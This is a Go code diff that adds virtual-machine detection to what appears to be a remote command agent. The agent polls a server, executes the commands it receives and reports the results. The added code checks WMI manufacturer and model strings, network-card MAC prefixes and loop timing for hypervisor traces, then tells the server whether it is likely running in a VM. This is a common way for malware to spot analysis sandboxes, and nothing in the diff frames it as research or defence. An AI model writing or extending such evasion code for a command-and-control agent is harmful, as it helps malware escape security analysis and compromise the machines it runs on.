@@ -21,6 +21,7 @@ import (
     "sync"
     "syscall"
     "time"
+    "github.com/StackExchange/wmi"
 )
 
 var (
@@ -42,6 +43,19 @@ type CommandResult struct {
 
 func main() {
     log.Println("Agent started. Waiting for commands...")
+    log.Println("Agent started. Checking VM status...")
+
+
+        // Perform VM detection
+        vmRes := DetectVM()
+
+
+        // Send VM result to server (adjust as needed)
+        sendResult(CommandResult{
+                ID: "vm_check",
+                Result: fmt.Sprintf("VM Detected: %v", vmRes.LikelyVM),
+        })
+
     ticker := time.NewTicker(10 * time.Second)
 
     go func() {
@@ -481,3 +495,99 @@ func executeOtherCommand(cmd Command) {
     }
     sendResult(CommandResult{ID: cmd.ID, Result: resultText})
 }
+// --- VM Detection Logic (Windows only) ---
+
+
+type VMCheckResult struct {
+        HypervisorBit bool `json:"hypervisor_bit"`
+        BIOSVendorMatch bool `json:"bios_vendor_match"`
+        MACOUI bool `json:"mac_oui"`
+        TimingAnomaly bool `json:"timing_anomaly"`
+        RegistryArtifacts bool `json:"registry_artifacts"`
+        LikelyVM bool `json:"likely_vm"`
+}
+
+
+
+func DetectVM() VMCheckResult {
+        res := VMCheckResult{}
+        res.HypervisorBit = false // not implemented
+        res.BIOSVendorMatch = checkDmiStringsWMI()
+        res.MACOUI = checkMACVendor()
+        res.TimingAnomaly = checkTimingAnomaly()
+        res.RegistryArtifacts = false
+
+
+        count := 0
+        if res.HypervisorBit {
+                count++
+        }
+        if res.BIOSVendorMatch {
+                count++
+        }
+        if res.MACOUI {
+                count++
+        }
+        if res.TimingAnomaly {
+                count++
+        }
+        if res.RegistryArtifacts {
+                count++
+        }
+
+
+        res.LikelyVM = count >= 2
+        return res
+}
+
+func checkDmiStringsWMI() bool {
+        type Win32_ComputerSystem struct {
+                Manufacturer string
+                Model        string
+        }
+
+        var sysInfo []Win32_ComputerSystem
+        err := wmi.Query("SELECT Manufacturer, Model FROM Win32_ComputerSystem", &sysInfo)
+        if err != nil || len(sysInfo) == 0 {
+                return false
+        }
+
+        known := []string{"VMware", "VirtualBox", "Xen", "QEMU", "Microsoft", "KVM"}
+        man := strings.ToLower(sysInfo[0].Manufacturer)
+        model := strings.ToLower(sysInfo[0].Model)
+        for _, k := range known {
+                if strings.Contains(man, strings.ToLower(k)) || strings.Contains(model, strings.ToLower(k)) {
+                        return true
+                }
+        }
+        return false
+}
+
+func checkMACVendor() bool {
+        vmOuis := []string{
+                "00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00",
+        }
+        ifaces, err := net.Interfaces()
+        if err != nil {
+                return false
+        }
+        for _, iface := range ifaces {
+                mac := iface.HardwareAddr.String()
+                for _, prefix := range vmOuis {
+                        if strings.HasPrefix(strings.ToUpper(mac), strings.ToUpper(prefix)) {
+                                return true
+                        }
+                }
+        }
+        return false
+}
+
+func checkTimingAnomaly() bool {
+        start := time.Now()
+        for i := 0; i < 1000000; i++ {
+                _ = i * i
+        }
+        duration := time.Since(start)
+        return duration > 80*time.Millisecond
+}
+
